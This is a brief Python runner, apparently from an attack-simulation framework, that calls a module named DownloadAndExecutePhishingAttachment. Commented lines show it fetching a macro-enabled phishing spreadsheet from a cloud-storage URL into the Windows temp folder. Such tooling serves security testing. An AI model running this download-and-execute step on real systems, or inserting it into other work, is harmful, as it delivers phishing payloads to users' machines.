from core.module.windows.D import DownloadAndExecutePhishingAttachment


if __name__ == '__main__':
    # module = DownloadAndExecutePhishingAttachment()
    # print(file_exist("$env:temp\wsu8257.tmp"))
    # print(download("https://cym-rt-resources.s3-eu-west-1.amazonaws.com/PhishingAttachment.xlsm", "$env:temp\PhishingAttachment.xlsm")[1].decode('big5'))
    m = DownloadAndExecutePhishingAttachment()
    # print(repr(m.execution))
    # print(m.execution.dependencies)

    # Template Main
    # print(m.check_dependency())
    print(m.execute())
